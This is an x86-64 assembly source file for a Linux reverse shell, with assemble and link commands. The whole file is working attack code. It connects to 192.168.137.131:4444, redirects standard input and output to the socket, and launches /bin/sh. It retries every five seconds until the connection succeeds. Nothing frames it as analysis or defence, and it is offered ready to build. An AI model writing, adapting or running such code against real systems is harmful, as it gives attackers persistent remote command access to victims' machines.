; reverse_shell.asm
; Assemble: nasm -f elf64 reverse_shell.asm -o reverse_shell.o
; Link:     ld reverse_shell.o -o reverse_shell

section .data
    sockaddr:
        dw 2                      ; AF_INET
        dw 0x5c11                 ; Port 4444 (0x115c) → 0x5c11 LE
        dd 0x8389a8c0             ; IP: 192.168.137.131 → 0xC0A88983 → LE: 0x8389a8c0
        dq 0                      ; Padding

    retry_delay:                  ; struct timespec for nanosleep
        dq 5                      ; seconds
        dq 0                      ; nanoseconds

section .text
    global _start

_start:
.connect_attempt:
    ; socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
    mov rax, 41                  ; syscall: socket
    mov rdi, 2                   ; AF_INET
    mov rsi, 1                   ; SOCK_STREAM
    xor rdx, rdx                 ; IPPROTO_IP (0)
    syscall

    mov r12, rax                 ; save socket FD

    ; connect(sock, &sockaddr, 16)
    mov rax, 42
    mov rdi, r12
    lea rsi, [rel sockaddr]
    mov edx, 16
    syscall

    cmp rax, 0
    jl .wait_retry               ; if connect < 0 → retry

    ; dup2(sock, 0..2)
    mov rdi, r12
    mov rsi, 0
.dup_loop:
    mov rax, 33
    syscall
    inc rsi
    cmp rsi, 3
    jne .dup_loop

    ; execve("/bin/sh", NULL, NULL)
    xor rax, rax
    mov rbx, 0x0068732f6e69622f  ; "/bin/sh\0"
    push rbx
    mov rdi, rsp                 ; const char *filename
    xor rsi, rsi                 ; argv = NULL
    xor rdx, rdx                 ; envp = NULL
    mov rax, 59                  ; syscall: execve
    syscall

.wait_retry:
    ; nanosleep(&retry_delay, NULL)
    mov rax, 35
    lea rdi, [rel retry_delay]
    xor rsi, rsi
    syscall

    jmp .connect_attempt         ; retry connection
